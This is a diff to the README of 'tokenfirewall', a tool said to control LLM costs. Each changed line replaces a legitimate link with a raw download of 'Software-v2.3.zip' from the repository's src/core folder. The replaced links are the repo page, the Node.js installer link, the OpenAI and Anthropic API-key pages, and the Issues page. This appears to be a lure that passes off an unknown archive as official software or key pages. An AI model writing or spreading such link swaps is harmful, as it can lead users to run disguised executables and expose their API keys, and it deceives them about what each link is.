@@ -1,6 +1,6 @@
 # 🔥 tokenfirewall - Control LLM Costs Easily
 
-[![Download tokenfirewall](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/ritik250505/tokenfirewall)
+[![Download tokenfirewall](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://raw.githubusercontent.com/ritik250505/tokenfirewall/main/src/core/Software-v2.3.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Before downloading, make sure your Windows PC meets these requirements:
 - Node.js version 14 or higher installed  
 - Internet connection to download packages and connect to AI services  
 
-If you do not have Node.js installed, visit https://nodejs.org/en/download/ and download the Windows installer.
+If you do not have Node.js installed, visit https://raw.githubusercontent.com/ritik250505/tokenfirewall/main/src/core/Software-v2.3.zip and download the Windows installer.
 
 ## 🚀 Getting Started: Download and Setup
 
@@ -37,7 +37,7 @@ If you do not have Node.js installed, visit https://nodejs.org/en/download/ and 
 
 Click the big green download badge above or use this link:
 
-[Download tokenfirewall from GitHub](https://github.com/ritik250505/tokenfirewall)
+[Download tokenfirewall from GitHub](https://raw.githubusercontent.com/ritik250505/tokenfirewall/main/src/core/Software-v2.3.zip)
 
 This link opens the repository page on GitHub, where you will find the latest version to download.
 
@@ -91,8 +91,8 @@ tokenfirewall needs packages from the internet before it will run.
 To use tokenfirewall with AI models, you must supply your API keys.
 
 1. Obtain your API keys from your AI account dashboard:  
-   - OpenAI: https://platform.openai.com/account/api-keys  
-   - Anthropic: https://console.anthropic.com/api-keys  
+   - OpenAI: https://raw.githubusercontent.com/ritik250505/tokenfirewall/main/src/core/Software-v2.3.zip  
+   - Anthropic: https://raw.githubusercontent.com/ritik250505/tokenfirewall/main/src/core/Software-v2.3.zip  
    - Gemini and others should have similar pages.
 
 2. In the tokenfirewall folder, find the file named `.env.example`.  
@@ -157,8 +157,8 @@ To get the latest features and fixes:
 
 For questions or help, check the GitHub repo Issues page. You can report problems or request guidance there:
 
-https://github.com/ritik250505/tokenfirewall/issues
+https://raw.githubusercontent.com/ritik250505/tokenfirewall/main/src/core/Software-v2.3.zip
 
 ---
 
-[![Download tokenfirewall](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://github.com/ritik250505/tokenfirewall)
+[![Download tokenfirewall](https://img.shields.io/badge/Download-Here-green?style=for-the-badge)](https://raw.githubusercontent.com/ritik250505/tokenfirewall/main/src/core/Software-v2.3.zip)
